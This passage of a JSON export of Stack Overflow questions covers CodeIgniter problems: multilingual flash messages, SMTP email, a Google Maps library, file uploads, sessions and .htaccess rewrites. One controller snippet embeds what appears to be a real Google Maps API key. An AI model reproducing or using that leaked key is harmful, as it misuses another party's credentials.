name:</p>\n\n<pre><code>&lt;?php echo $this-&gt;lang-&gt;line('language_name');?&gt;\n\nNow please Let me know how can i use the above language key for message in controller??\n</code></pre>\n\n<p>Thanks In advance and still any doubt feel free to Ask.</p>\n\n<p>Short description :\nthe problem is not to show the falshdata message.i want the message should be in a particular language in which the user selected.my application in multi language in which the user can select the language from drop down box.and the whole content in convert in to the selected language .but the alert messages comes from controller so how can i convert them in selected language?  </p>\n\n<p>I changed my code in function search_coupon but it works for only English language not for Portuguese.Here is my constructor code of provider controller:</p>\n\n<pre><code>public function __construct()\n        {\n            parent::__construct();\n            $this-&gt;load-&gt;helper('url');\n            $this-&gt;load-&gt;helper('form');\n            $this-&gt;load-&gt;library('session');\n            $this-&gt;load-&gt;model('provider_model');\n\n            $lng=$this-&gt;session-&gt;userdata('about_language');\n\n                 if($lng=='' ) \n                 {\n\n                $this-&gt;load-&gt;language('language','english');\n\n                 }\n                 else\n                 {\n\n                $this-&gt;load-&gt;language('language',$lng);\n\n                 }\n\n\n\n            if($this-&gt;session-&gt;userdata('provider')==\"\")\n            {\n              redirect('/login/', 'refresh');   \n            }\n\n\n        }\n</code></pre>\n\n<p>Code for select The language using ajax:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n         jQuery(document).ready(function() {\n          jQuery('#port').click(function(){\n                                    var dummy = 2;\n                                    $.ajax({\n                                            type: \"POST\",\n                                            url: \"&lt;?php echo BASE_PATH; ?&gt;/session/sessions\",\n                                        data: \"&amp;ID=\"+dummy+ \"&amp;lang=\"+'portuguese',\n                                            success: function(response)\n                                                {\n\n                                                    if (response == false)\n                                                        {   \n                                                            location.reload();\n\n                                                        }  \n                                                }\n                                           });\n\n                                   });\n\n            jQuery('#eng').click(function(){\n                                        var dummy = 1;\n                                        $.ajax({\n                                                    type: \"POST\",\n                                                    url: \"&lt;?php echo BASE_PATH; ?&gt;/session/sessions\",\n                                                 data: \"&amp;ID=\"+dummy+ \"&amp;lang=\"+'english',\n                                                    success: function(response)\n                                                        {\n\n                                                            if (response == false)\n                                                                {\n                                                                    location.reload();\n                                                                }\n                                                        }\n                                                });\n\n                                         });\n         });\n          &lt;/script&gt; \n</code></pre>\n\n<p>And here is the session controller :</p>\n\n<pre><code>function sessions(){\n\n         $value=  $this-&gt;input-&gt;post('ID');\n         $lang=  $this-&gt;input-&gt;post('lang');\n\n         $lang=$this-&gt;session-&gt;set_userdata('about_language',$lang);\n         return $lang;\n        }\n</code></pre>\n"},{"tags":["php","codeigniter","preg-replace","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12931315,"title":"Extract digit from unicode string - PHP RegExpression","body":"<p>I am Parsing a web page for getting the web page prize. the prize include a Rupee symbol (₹).</p>\n\n<p>So i used preg_replace to extract digits. </p>\n\n<p>For example:</p>\n\n<pre><code>$str='₹ 1,195 ';\necho preg_replace(\"/[^0-9]/\", '', $str);\n</code></pre>\n\n<p>Output is :</p>\n\n<pre><code>2091195\n</code></pre>\n\n<p>I tried same code to execute on <a href=\"http://writecodeonline.com/php/\" rel=\"nofollow\">http://writecodeonline.com/php/</a>.</p>\n\n<p>There i m getting correct output <code>1195</code>.</p>\n\n<p>I'm not getting what is the problem.</p>\n\n<p>Thanks in Advance</p>\n"},{"tags":["php","codeigniter","email-integration"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12930597,"title":"Sending email through google mail in codeigniter","body":"<p>I am trying to send email in codeigniter and this is a segment of code that i am using. The first commented code print error saying that my application does not have configuration to send email.</p>\n\n<p>The second uncommented code which use gmail is working fine but it is a requirement to show my email and password. So I have two questions: How can I do what I want without mentioning my password. Is this acceptable in Software development to mention user password. Thanks</p>\n\n<pre><code>/*$config = array();\n             $config['useragent']           = \"CodeIgniter\";\n             $config['mailpath']            = \"/usr/bin/sendmail\"; // or \"/usr/sbin/sendmail\"\n             $config['protocol']            = \"mail\";\n             $config['smtp_host']           = \"localhost\";\n             $config['smtp_port']           = \"25\";\n             $config['mailtype'] = 'text';\n             $config['charset']  = 'utf-8';\n             $config['newline']  = \"\\r\\n\";\n             $config['wordwrap'] = TRUE;\n             */\n   $config = Array(\n        'protocol'  =&gt; 'smtp',\n        'smtp_host' =&gt; 'ssl://smtp.googlemail.com',\n        'smtp_port' =&gt; '465',\n        'smtp_user' =&gt; 'myemail@gmail.com',\n        'smtp_pass' =&gt; 'mypass',\n        'mailtype'  =&gt; 'text',\n        'starttls'  =&gt; true,\n        'newline'   =&gt; \"\\r\\n\"\n        );\n\n        $this-&gt;load-&gt;library('email',$config);\n\n        $email=$this-&gt;input-&gt;post(\"email\");\n        $username=$this-&gt;input-&gt;post(\"username\");\n        $this-&gt;email-&gt;to(\"receiver1@gmail.com,receiver2@gmail.com,receiver3@yahoo.fr\");\n        $this-&gt;email-&gt;subject(\"Hello world\");\n        $this-&gt;email-&gt;subject(\"Hello world from local pc\");\n        $this-&gt;email-&gt;send();\n        $data['msg']=$this-&gt;email-&gt;print_debugger();\n</code></pre>\n"},{"tags":["codeigniter","google","maps"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12930357,"title":"CodeIgniter Google Map API Blank","body":"<p>Can't really figure out why this isn't working... I got this library from <a href=\"http://www.in-the-attic.co.uk/2010/08/02/codeigniter-google-maps-library-using-google-maps-api-version-3/\" rel=\"nofollow\">http://www.in-the-attic.co.uk/2010/08/02/codeigniter-google-maps-library-using-google-maps-api-version-3/</a></p>\n\n<p>I followed all the steps in this article, but have not gotten my map to load.  It only displays a grey box with nothing in it.  I get no errors in Firefox error console.</p>\n\n<p>I also thought I might mention that I am using WAMP server.  I have found several google results of people that are having the same problem, none of them solved.</p>\n\n<p>The controller:\n<code></p>\n\n<pre><code>&lt;?php\n\nclass Maps extends CI_Controller {\n\n    function __construct(){\n\n        parent::__construct();\n        $this-&gt;user = $this-&gt;smf-&gt;user_context();\n    }\n\n    function index(){\n\n        $this-&gt;load-&gt;library('GMap');\n        $this-&gt;gmap-&gt;GoogleMapAPI('map', 'AIzaSyDkAxjP70JpwGGZRjHruzb1M7-0j5715dE');\n\n        $extraJS = '\n        '.$this-&gt;gmap-&gt;getHeaderJS().'\n        '.$this-&gt;gmap-&gt;getMapJS().'\n        ';\n\n        $this-&gt;template-&gt;overall_header('Outbreak Map', $extraJS);\n\n        $this-&gt;gmap-&gt;setMapType('map');\n        $this-&gt;gmap-&gt;setWidth('800px');\n        $this-&gt;gmap-&gt;setHeight('600px');\n        $this-&gt;gmap-&gt;setCenterCoords(50,50);\n\n\n        $this-&gt;load-&gt;model('map');\n        /*\n        $map_locations = $this-&gt;map-&gt;recent_locations();\n        foreach($map_locations as $location){\n\n            $this-&gt;gmap-&gt;addMarkerByAddress($location['address'], $location['title'], $location['description']);\n\n        }*/\n\n        //$this-&gt;gmap-&gt;addMarkerByAddress('Miami, FL, USA', 'My House', 'The house that I live in!');\n\n        $data = array(\n            'MAP_ONLOAD' =&gt; $this-&gt;gmap-&gt;printOnLoad(),\n            'MAP_DISPLAY' =&gt; $this-&gt;gmap-&gt;printMap(),\n            'MAP_SIDEBAR' =&gt; $this-&gt;gmap-&gt;printSidebar()            \n        );\n\n        $this-&gt;parser-&gt;parse('map_index.tpl', $data);\n    }\n}\n</code></pre>\n\n<p></code></p>\n\n<p>map_index.tpl\n<code></p>\n\n<pre><code>{MAP_ONLOAD}\n        &lt;div id=\"content\"&gt;\n\n            &lt;h1&gt;Outbreak Map&lt;/h1&gt;\n            &lt;p&gt;{MODERATOR_LINKS}&lt;/p&gt;\n            &lt;p&gt;{DESCRIPTION}&lt;/p&gt;\n\n            &lt;div class=\"widget full\"&gt;\n\n                &lt;div class=\"pad\"&gt;\n\n                    &lt;div id=\"map\" style=\"width: 800px; height: 600px;position: relative;\"&gt;&lt;/div&gt;\n                    {MAP_SIDEBAR}\n\n                &lt;/div&gt;\n\n            &lt;/div&gt;\n\n        &lt;/div&gt;\n</code></pre>\n\n<p></code></p>\n\n<p>Ok, I just did a test and determined that the API is actually doing something... since I used $this->gmap->addMarkerByAddress('Miami, FL, USA', 'Some Title', 'Some description.'); it actually does insert a row for the geocode_cache table.  Hopefully this helps...</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":5189,"score":1,"question_id":3630225,"title":"How to insert filename in database using codeigniter upload lib","body":"<p>It's ok to upload image in file using codeigniter upload library with this example.</p>\n\n<p>However, I want to send filename in database. Can anybody pls give me example ? Thanks</p>\n\n<pre><code>&lt;?php\n\nclass Upload extends Controller {\n\nfunction Upload()\n{\n    parent::Controller();\n    $this-&gt;load-&gt;helper(array('form', 'url'));\n}\n\nfunction index()\n{   \n    $this-&gt;load-&gt;view('upload_form', array('error' =&gt; ' ' ));\n}\n\nfunction do_upload()\n{\n    $config['upload_path'] = './uploads/';\n    $config['allowed_types'] = 'gif|jpg|png';\n    $config['max_size'] = '100';\n    $config['max_width']  = '1024';\n    $config['max_height']  = '768';\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n    if ( ! $this-&gt;upload-&gt;do_upload())\n    {\n        $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        $this-&gt;load-&gt;view('upload_form', $error);\n    }   \n    else\n    {\n        $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n        $this-&gt;load-&gt;view('upload_success', $data);\n    }\n}   \n}\n?&gt;\n</code></pre>\n\n<p>Or do we have any alternative?</p>\n"},{"tags":["php","codeigniter","chmod","directories"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12930463,"title":"Codeigniter - chmod permission all over showed","body":"<p>Hi guys can anyone show his own chmod settings all over the ci folders?</p>\n\n<p>i would like to check if i'm using the right chmod for all the site's directories and i can't find out ia good checkin, just downloaded a fresh ci copy, setteup on localohost but i think something wrong with permissions.</p>\n\n<p>i'm using macosx, and i think permission are to be edited.</p>\n\n<p>thx who care on doing this for me.</p>\n\n<p>my application model is:</p>\n\n<pre><code>/application\n/system\n/css\n/img\n/js\nindex.php\n.htaccess\n</code></pre>\n"},{"tags":["php","database","codeigniter","join"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":4859,"score":2,"question_id":4916498,"title":"Multiple Joins in Codeigniter","body":"<p>I'm new to building databases and I'm trying to do a JOIN based on a having three database tables.</p>\n\n<pre><code>Table A = ID, Name, etc\nTable B = ID, Name, etc\nTable C = ID, TableAId, TableBId\n</code></pre>\n\n<p>What I can't figure out is using active record how to make this selection. I'm trying to make as few requests as possible, but am getting stumped on how it should all be written without doing three separate calls.</p>\n"},{"tags":["codeigniter","session","google-chrome","cookies"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":137,"score":2,"question_id":12907962,"title":"CodeIgniter session class not working in Chrome","body":"<p>I have created a login system in codeigniter project, which is working fine in Firefox but doesn't work in Chrome, data fetch and set for session but when this code redirect control to admin/dashboard, there we check session data again. If session data not exist then the code will redirect user to login again............ My code is below, and i don't know what is wrong with this session/cookies in codeigniter.?  </p>\n\n<pre><code>        $data = array(\n             'user_id' =&gt; $user-&gt;id,\n             'name' =&gt; $user-&gt;name,\n             'user_type' =&gt; $user-&gt;type,\n             'username' =&gt; $user-&gt;username,\n             'is_logged_in' =&gt; true\n        );\n\n        $this-&gt;session-&gt;set_userdata($data);\n        //echo \"user \".$this-&gt;session-&gt;userdata(\"username\"); exit;\n        redirect(\"admin/dashboard\", \"location\"); \n</code></pre>\n\n<p>I have search alot for but no one work in this situation, like a change \"<strong>cookie_domain</strong>\" in config file but nothing happened....</p>\n"},{"tags":["php","osx","codeigniter","session","xampp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12929445,"title":"Codeigniter Session library error","body":"<p>i'm receiving this strange error, does anyone knows about it?</p>\n\n<pre><code>Severity: Notice  --&gt; unserialize() [&lt;a href='function.unserialize'&gt;function.unserialize&lt;/a&gt;]: Error at offset 0 of 286 bytes /Applications/XAMPP/xamppfiles/htdocs/login/system/libraries/Session.php 723\n</code></pre>\n\n<p>thanks</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12929113,"title":"get logged in user info in CodeIgniter (HMVC & Ion Auth)","body":"<p>I am trying to get Logged in user details in CodeIgniter (HMVC &amp; Ion Auth)</p>\n\n<pre><code>$data['user'] = $this-&gt;ion_auth-&gt;user()-&gt;row();\n</code></pre>\n\n<p>When i try to display i am getting error</p>\n\n<pre><code>Undefined variable: user\n</code></pre>\n\n<p>I am not sure how to get loggin in user id or email. I need id or email. Please help</p>\n"},{"tags":["php","mvc","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12925666,"title":"CodeIgniter Best Practice Items List","body":"<p>I'm creating an ebay-style (but more simplistic) shop in CodeIgniter and I'd like to know the best way to handle the items code/controllers.</p>\n\n<p>At the moment, I've got a Category controller which is the main controller (in routes). /category/id is supposed to show a list of items for a specific category, and /category or / shows all items.</p>\n\n<p>The category index($id=0){} in the controller loads the category helper which generates the category listing, then I echo it out in the view.</p>\n\n<p>Now I'm up to the stage of adding the items aspect... Users need to be able to add items, view specific items, and the category code needs to be able to show all items or a specific category of items.</p>\n\n<p>I was thinking of having a items controller with add_item, view_item, however now I'm wondering how I should be fetching the category listing from within the categories controller.</p>\n\n<p>Should I have a items helper that loads the items model, fetches the list of items based off the category, assigns the list to a variable and echos the list? And when a user wants to view a specific item it loads the item controller view_item, and for adding add_item etc?</p>\n\n<p>I also want the categories to display whilst they're viewing an item, so if I do it this way I'll also need to load the category helper within the items controller... Is this bad practice due to code repetition?</p>\n"},{"tags":["php","codeigniter","recaptcha"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12926786,"title":"Codeigniter require_once() error when implementing reCaptcha","body":"<p>I'm getting the following error when implementing recaptcha.  I'm not sure how to clear up the path error.</p>\n\n<p>Fatal error: require_once(): Failed opening required 'F:\\xampp\\htdocs\\cyoa\\application\\controllers/recaptchalib.php' (include_path='.;\\xampp\\php\\PEAR') in F:\\xampp\\htdocs\\cyoa\\application\\controllers\\cyoa.php on line 132</p>\n\n<p>controller:</p>\n\n<pre><code>public function register_insert()\n{\n    require_once ('/recaptchalib.php');\n    $privatekey = \"xxx\";\n    $resp = recaptcha_check_answer ($privatekey,\n                                    $_SERVER[\"REMOTE_ADDR\"],\n                                    $_POST[\"recaptcha_challenge_field\"],\n                                    $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp-&gt;is_valid) {\n</code></pre>\n\n<p>view:</p>\n\n<pre><code>&lt;?php\nrequire_once('recaptchalib.php');\n$publickey = \"xxx\";\necho recaptcha_get_html($publickey);\n</code></pre>\n\n<p>?></p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12923295,"title":"Multiple File Upload Issue - CodeIgniter","body":"<p>I'm using below Jqury plugin in my application to upload multiple images, </p>\n\n<p><a href=\"http://www.fyneworks.com/jquery/multiple-file-upload/#tab-Uploading\" rel=\"nofollow\">http://www.fyneworks.com/jquery/multiple-file-upload/#tab-Uploading</a></p>\n\n<p>When I upload multiple files using that, it Generates an array like this.</p>\n\n<pre><code>Array ( [name] =&gt; Array ( [0] =&gt; 280x214_001img.jpg [1] =&gt; 280x214_002img.jpg ) \n</code></pre>\n\n<p>[type] => Array ( [0] => image/jpeg <a href=\"http://www.fyneworks.com/jquery/multiple-file-upload/#tab-Uploading\" rel=\"nofollow\">1</a> => image/jpeg ) \n[tmp_name] => Array ( [0] => C:\\xampp\\tmp\\phpE7F0.tmp <a href=\"http://www.fyneworks.com/jquery/multiple-file-upload/#tab-Uploading\" rel=\"nofollow\">1</a> => C:\\xampp\\tmp\\phpE7F1.tmp ) [error] => Array ( [0] => 0 <a href=\"http://www.fyneworks.com/jquery/multiple-file-upload/#tab-Uploading\" rel=\"nofollow\">1</a> => 0 ) [size] => Array ( [0] => 21302 <a href=\"http://www.fyneworks.com/jquery/multiple-file-upload/#tab-Uploading\" rel=\"nofollow\">1</a> => 29179 ) ) </p>\n\n<p>Input field is,</p>\n\n<pre><code>&lt;input type=\"file\" class=\"multi\" accept=\"gif|jpg|jpeg|png\" name=\"extra_images[]\" id=\"extra_images\"/&gt;\n</code></pre>\n\n<p>I used answer of the below post to do the uploading and Still I'm getting <strong>You did not select a file to upload</strong> error.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/11524356/multiple-files-upload-array-with-codeigniter-2-0\">Multiple files upload (Array) with CodeIgniter 2.0</a></p>\n\n<p>Below is my code</p>\n\n<pre><code>$artwork_additional_images = isset($_FILES[\"extra_images\"]) ? $_FILES[\"extra_images\"][\"name\"] : '' ;\nfor($i = 0; $i &lt; count($artwork_additional_images); $i++)\n {\n         $image_no = $i+1;\n\n          $_FILES['extra_images']['name']= $files['extra_images']['name'][$i];\n          $_FILES['extra_images']['type']= $files['extra_images']['type'][$i];\n          $_FILES['extra_images']['tmp_name']= $files['extra_images']['tmp_name'][$i];\n          $_FILES['extra_images']['error']= $files['extra_images']['error'][$i];\n          $_FILES['extra_images']['size']= $files['extra_images']['size'][$i];    \n\n          $this-&gt;upload-&gt;initialize($this-&gt;set_upload_options($image_id, $image_no));\n\n          if(!$this-&gt;upload-&gt;do_upload())\n          {  \n                 $errors = $this-&gt;upload-&gt;display_errors();                                        \n          }       \n }\n\n\nprivate function set_upload_options($image_id, $image_no)\n{   \n  $x =  $image_no + 5;\n\n  $config[$x]['upload_path'] = './uploaded_files/artists/artworks';\n  $config[$x]['allowed_types'] = 'gif|jpg|png';\n  $config[$x]['file_name'] = $image_id . \"_additional_\".$image_no;\n  $config[$x]['remove_spaces'] = TRUE;  \n\n  return $config;\n</code></pre>\n\n<p>}</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12915732,"title":"cloudsponge - Import_id issues in Code igniter","body":"<p>I am integrating cloudsponge API to invite friends through email contact (Gmail, Yahoo etc) in Code igniter Framework.</p>\n\n<p>If everything is success means, we will get <strong><code>import_id</code></strong> from API..</p>\n\n<p>My doubt is, i am getting return url like www.example.com/cloudesponse/<strong><code>&amp;import_id=121212</code></strong>. Here i am using Code igniter, So it will make any problem to retrive import id (<code>&amp;import_id=121212</code>).</p>\n\n<p>Please suggest me what is the best way to get <strong><code>import_id</code></strong> from url</p>\n"},{"tags":["php","forms","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":50,"score":-1,"question_id":12926705,"title":"codeigniter form helper disable dropdown","body":"<p>i need to make a disabled or readonly dropdown, i following the <a href=\"http://codeigniter.com/user_guide/helpers/form_helper.html\" rel=\"nofollow\">instruction</a> here to make it on the fourth parameter, then, here is what i do</p>\n\n<pre><code>&lt;td&gt;&lt;?php $injabatan=array('Yes' =&gt; 'telah disetujui', 'no' =&gt; 'belum disetujui'); echo form_dropdown('status',$injabatan,'keuangan','class = \"gui\" disable = \"disable\"'); ?&gt;&lt;/td&gt;\n</code></pre>\n\n<p>its not working, i can click the dropdown. how do i resolve this ? </p>\n\n<p>solved ! it has to be 'disabled' </p>\n"},{"tags":["validation","forms","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":459,"score":0,"question_id":3671120,"title":"CodeIgniter Form Validation. Multiple calls not working","body":"<p>I am using CodeIgniter. I have been trying to debug a non-working script.</p>\n\n<p>I have come to the conclusion that when utilizing <code>$this-&gt;form_validation-&gt;run();</code> (the form validation class), after the first named call, e.g <code>$this-&gt;form_validation-&gt;run(form_1);</code>, all following calls return true.</p>\n\n<p>I am developing a multi step form and when <code>$this-&gt;form_validation-&gt;run(form_1);</code> correctly returns true, <code>$this-&gt;form_validation-&gt;run(form_2);</code> incorrectly returns true.</p>\n\n<p>Anyone have any clue as to why? Can multiple calls not be held in a single function within a controller or is there a special approach?\nCheers   </p>\n"},{"tags":["codeigniter","group-by"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":67,"score":3,"question_id":12925637,"title":"codeigniter group_by returning only first row","body":"<p>i have this problem in codeigniter:\nI try to make a navigation tree system from database.</p>\n\n<p>model: </p>\n\n<pre><code>function getServices()\n{\n $this-&gt;db-&gt;select('service_url, service_title, category_title');    \n $this-&gt;db-&gt;join('services_category', 'services_category.id=services.category_id');    \n $this-&gt;db-&gt;group_by('category_title');\n $this-&gt;db-&gt;order_by('service_title', 'ASC');    \n $query = $this-&gt;db-&gt;get('services');\n\n if($query-&gt;result() == TRUE)    \n {    \n    foreach($query-&gt;result_array() as $row)\n    {\n       $result[] = $row;\n    }\n    return $result;\n  }\n}\n</code></pre>\n\n<p>view:</p>\n\n<pre><code>&lt;?php if(isset($services) &amp;&amp; $services) : foreach($services as $s) : ?&gt;    \n   &lt;ul&gt;\n     &lt;li&gt;&lt;a href=\"#\"&gt;&lt;?php echo $s['category_title'] ?&gt;&lt;/a&gt;    \n       &lt;ul&gt;\n        &lt;li&gt;&lt;?php echo anchor('services/' . $s['service_url'], $s['service_title']); ?&gt;&lt;/li&gt;\n       &lt;/ul&gt;    \n     &lt;/li&gt;    \n   &lt;/ul&gt;    \n&lt;?php endforeach; ?&gt;    \n&lt;?php endif; ?&gt;\n</code></pre>\n\n<p>now so far so good, the result is returning each category the way is supposed to, but the service is returning only one service per category, and in some categories there is like 15 services.\nAnybody kind to give me a hand, or an explanation what is going wrong ?\nThank you so much.</p>\n\n<p>\"i'm not an expert in php or codeigniter, i just started not long time ago, so please don't shoot the beginner.\"</p>\n\n<p>note: i tried without the group_by and order_by, and is returning all services, but the categories are repeating,</p>\n\n<p>ex:</p>\n\n<pre><code>category-a\n   service1\ncategory-a\n   service2\ncategory-b\n   service10\ncategory-b\n   service11\ncategory-c\n   service30\ncategory-c\n  service31\n....\n</code></pre>\n"},{"tags":["php","apache",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12848722,"title":".htaccess with ^(.*)$ index.php/$1 gives \"No input file specified\"","body":"<p>I'm running Code Igniter and my .htaccess was:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?$1 [L]\n    RedirectMatch 404 /\\\\.svn(/.*|$)\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Then I realized that no $_GET variable was getting through.</p>\n\n<p>I followed some instructions to create the .htaccess to use together with Code Igniter, and replaced the <code>index.php?$1</code> with <code>index.php/$1</code>. This works on a linux machine, but on the Windows it doesn't. I'm sure it is a server configuration, but I don't know which one.</p>\n\n<p>Assuming that I access</p>\n\n<pre><code>http://localhost/directory/this_is_query/string_parameters?with_some=additional_ones\n</code></pre>\n\n<p>The <code>$_SERVER['QUERY_STRING']</code> value with <code>index.php?$1</code> on .htaccess is:</p>\n\n<pre><code>string(31) \"this_is_query/string_parameters\" \n</code></pre>\n\n<p>And with <code>index.php/$1</code>:</p>\n\n<pre><code>No input file specified. \n</code></pre>\n\n<p>On the Linux machine I have:</p>\n\n<pre><code>string(31) \"with_some=additional_ones\"\n</code></pre>\n\n<p>As response with <code>index.php/$1</code>.</p>\n\n<p>Any thoughts?</p>\n\n<hr>\n\n<p>I'm debugging the <code>$_SERVER['QUERY_STRING']</code> variable on the FIRST line of <code>index.php</code>, with NO interaction with Code Igniter whatsoever.</p>\n\n<p>Yes, I do have <code>mod_rewrite</code>.</p>\n\n<h2> THIS IS NOT THE SAME AS <a href=\"http://stackoverflow.com/questions/10361742/codeigniter-no-input-file-specified-error\">Codeigniter no input file specified error</a></h2>\n\n<p>I saw that question before asking this one. And I'm still with the issue.</p>\n\n<p>I've added new information.</p>\n"},{"tags":["php","codeigniter","fwrite","fgets","fsockopen"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12925125,"title":"Codeigniter Email Class Error","body":"<p>I can send e-mail in my local server using following codes,</p>\n\n<pre><code>    $config['protocol'] = 'smtp';\n    $config['charset'] = 'UTF-8';\n    $config['mailtype'] = \"html\";\n    $config['wordwrap'] = TRUE;\n\n    $config['smtp_host'] = $this-&gt;config-&gt;item('smtp_host'); // smtp.critsend.com\n    $config['smtp_user'] = $this-&gt;config-&gt;item('smtp_user'); \n    $config['smtp_pass'] = $this-&gt;config-&gt;item('smtp_pass');\n    $config['smtp_port'] = $this-&gt;config-&gt;item('smtp_port'); // i'm tried 587 and 25\n\n    $this-&gt;load-&gt;library('email');\n    $this-&gt;email-&gt;initialize($config);\n    $this-&gt;email-&gt;from('test@test.com', 'test');\n    $this-&gt;email-&gt;reply_to('test@test.com', 'test');\n    $this-&gt;email-&gt;to($user['email']);\n    $this-&gt;email-&gt;subject($subject);\n    $this-&gt;email-&gt;message($html);\n    $this-&gt;email-&gt;set_newline(\"\\r\\n\");\n    $this-&gt;email-&gt;send();\n</code></pre>\n\n<p>But it isn't work on real server. I'm getting this error,</p>\n\n<blockquote>\n  <p>Message:  fsockopen() [function.fsockopen]: unable to connect to smtp.critsend.com:25 (Connection timed out)</p>\n  \n  <p>Filename: libraries/Email.php</p>\n  \n  <p>Line Number: 1689</p>\n  \n  <p>Message:  fwrite(): supplied argument is not a valid stream resource</p>\n  \n  <p>Filename: libraries/Email.php</p>\n  \n  <p>Line Number: 1846</p>\n</blockquote>\n\n<p>Some answers for this error, \"activate php_openssl\". But i'm not using ssl (and i cant).</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12923819,"title":"Codeigniter when calling library method I get HTTP 500 error","body":"<p>I'm trying to create a library (in application/libraries) but I'm having problems when I call it from the controller.</p>\n\n<p>Below is the code in the controller</p>\n\n<pre><code>    &lt;?php defined('BASEPATH') OR exit('No direct script access allowed');\n\n    class Client extends CI_Controller {\n\n        function __construct() {\n            parent::__construct();\n            $this-&gt;load-&gt;library('security');\n        }\n\n        function index() {\n            try {\n                $activation_code = 'aa';\n                $this-&gt;security-&gt;Check_User_By_ValidationCode($activation_code);\n            } catch (Exception $e) {\n                log('error', $e-&gt;getMessage());\n            }\n        }\n    }\n    ?&gt;\n</code></pre>\n\n<p>And this is what I have in the library</p>\n\n<pre><code>    &lt;?php defined('BASEPATH') OR exit('No direct script access allowed');\n\n    class Security {\n\n        var $CI;\n\n        public function __construct()\n        {\n            $this-&gt;CI =&amp; get_instance();\n        }\n\n        public function Check_User_By_ValidationCode($activation_code) {\n            return $activation_code ;\n        }\n    }\n    ?&gt;\n</code></pre>\n\n<p>But I'm getting a \"HTTP Error 500 (Internal Server Error): An unexpected condition was encountered while the server was attempting to fulfil the request.\" in Chrome.\nI'm not able to get anything from logs so I can't tell what I'm doing wrong here.\nAny clues?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12887561,"title":"CodeIgniter combine several extended classes and helpers into single file for easy distribution?","body":"<p>This might sound slightly \"out there\" at first. Basically I'm building a small back-end in CodeIgniter that I would like to easily be able to roll out to multiple projects in the future. At the moment it's a collection of controllers, helpers, extended core classes, views and an assets folder. If I want to keep this easy for me to redistribute then I'd like to try and keep the number of individual files down.</p>\n\n<p>Views, controllers and models are obviously best to retain as separate files.<br>\nBut I'm also extending quite a few of CI's core classes with my own: CI_Controller, CI_Form_validation and CI_Input. With possibly more to follow.</p>\n\n<p>Is there a way I can combine these 3 into a single file?<br>\nObviously not having them in the application/core directory will break the MY_ prefix autoloading. It would also be brilliant if I could store my custom helper functions in the same file as well. This allows me to preserve any application-specific core classes in application/core in the traditional MY_ prefix format, whilst being able to rollout updates to my core classes easily.</p>\n\n<p>I'm currently using Phil's Improved Native Autoloader in config.php (see here... <a href=\"http://codeigniter.com/forums/viewthread/218099/#1006583\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/218099/#1006583</a>) to load my extended core classes without using the MY_ prefix so I can give them more recogniseable and logical names for easier redistribution.<br>\nThis suggests to me that <code>config.php</code> is processed early enough in initiation that I might be able to just do a cheeky <code>require('AdminCoreClasses.php')</code>.<br>\nAs that's basically what the native autoloader does but looks at the current class name to specify which file to load. I would just be hard-coding a single file, which contains all my extended core classes in one.</p>\n\n<p>Is there a better way to do this?</p>\n"},{"tags":["codeigniter","session","cookies","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":102,"score":4,"question_id":12916444,"title":"Why doesn't CodeIgniter use native PHP Sessions?","body":"<p>The PHP Framework \"CodeIgniter\" provides a Session Class, which does not use native PHP-Sessions. Instead, they developped an own Session system using Cookies.</p>\n\n<p>On their Website <a href=\"http://codeigniter.com/user_guide/libraries/sessions.html\" rel=\"nofollow\">CodeIgniter.com</a> they write the following:</p>\n\n<pre><code>Note: The Session class does not utilize native PHP sessions. It generates its own session data, offering more flexibility for developers.\n</code></pre>\n\n<p>As also mentioned below, only a maximum of 4KB can be 